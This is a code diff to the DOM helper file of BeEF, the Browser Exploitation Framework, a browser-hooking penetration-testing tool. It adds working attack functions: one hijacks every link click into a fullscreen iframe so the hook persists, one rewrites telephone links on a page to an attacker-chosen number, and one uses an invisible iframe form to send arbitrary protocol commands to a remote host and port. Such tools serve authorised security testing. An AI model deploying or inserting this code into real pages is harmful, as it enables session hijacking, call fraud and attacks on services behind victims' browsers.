@@ -1,18 +1,9 @@
 //
-//   Copyright 2012 Wade Alcorn wade@bindshell.net
+// Copyright (c) 2006-2012 Wade Alcorn - wade@bindshell.net
+// Browser Exploitation Framework (BeEF) - http://beefproject.com
+// See the file 'doc/COPYING' for copying permission
 //
-//   Licensed under the Apache License, Version 2.0 (the "License");
-//   you may not use this file except in compliance with the License.
-//   You may obtain a copy of the License at
-//
-//       http://www.apache.org/licenses/LICENSE-2.0
-//
-//   Unless required by applicable law or agreed to in writing, software
-//   distributed under the License is distributed on an "AS IS" BASIS,
-//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-//   See the License for the specific language governing permissions and
-//   limitations under the License.
-//
+
 /*!
  * @literal object: beef.dom
  *
@@ -117,6 +108,25 @@ beef.dom = {
 		}
 		return iframe;
 	},
+
+    /**
+     * Load the link (href value) in an overlay foreground iFrame.
+     * The BeEF hook continues to run in background.
+     * NOTE: if the target link is returning X-Frame-Options deny/same-origin or uses
+     * Framebusting techniques, this will not work.
+     */
+    persistentIframe: function(){
+        $j('a').click(function(e) {
+            if ($j(this).attr('href') != '')
+            {
+                e.preventDefault();
+                beef.dom.createIframe('fullscreen', 'get', {'src':$j(this).attr('href')}, {}, null);
+                $j(document).attr('title', $j(this).html());
+                document.body.scroll = "no";
+                document.documentElement.style.overflow = 'hidden';
+            }
+        });
+    },
 	
 	/**
      * Create a form element with the specified parameters, appending it to the DOM if append == true
@@ -186,6 +196,31 @@ beef.dom = {
 				var url = $j(this).attr('href');
 				if (url.match(re)) {
 					$j(this).attr('href', url.replace(re, new_protocol+"://")).click(function() { return true; });
+					count++;
+				}
+			}
+		});
+
+		return count;
+	},
+
+	/**
+	 * Parse all links in the page matched by the selector, replacing all telephone urls ('tel' protocol handler) with a new telephone number
+	 * @param: {String} new_number: the new link telephone number to be written
+	 * @param: {String} selector: the jquery selector statement to use, defaults to all a tags.
+	 * @return: {Number} the amount of links found in the DOM and rewritten.
+	 */
+	rewriteTelLinks: function(new_number, selector) {
+
+		var count = 0;
+		var re = new RegExp("tel:/?/?.*", "gi");
+		var sel = (selector == null) ? 'a' : selector;
+
+		$j(sel).each(function() {
+			if ($j(this).attr('href') != null) {
+				var url = $j(this).attr('href');
+				if (url.match(re)) {
+					$j(this).attr('href', url.replace(re, "tel:"+new_number)).click(function() { return true; });
 					count++;
 				}
 			}
@@ -315,6 +350,30 @@ beef.dom = {
         formXsrf.submit();
 
         return iframeXsrf;
+    },
+
+    /**
+     * Create an invisible iFrame with a form inside, and POST the form in plain-text. Used for inter-protocol exploitation.
+     * @params: {String} rhost: remote host ip/domain
+     * @params: {String} rport: remote port
+     * @params: {String} commands: protocol commands to be executed by the remote host:port service
+     */
+    createIframeIpecForm: function(rhost, rport, commands){
+        var iframeIpec = beef.dom.createInvisibleIframe();
+
+        var formIpec = document.createElement('form');
+        formIpec.setAttribute('action',  'http://'+rhost+':'+rport+'/index.html');
+        formIpec.setAttribute('method',  'POST');
+        formIpec.setAttribute('enctype', 'multipart/form-data');
+
+        input = document.createElement('textarea');
+        input.setAttribute('name', Math.random().toString(36).substring(5));
+        input.value = commands;
+        formIpec.appendChild(input);
+        iframeIpec.contentWindow.document.body.appendChild(formIpec);
+        formIpec.submit();
+
+        return iframeIpec;
     }
 
 };
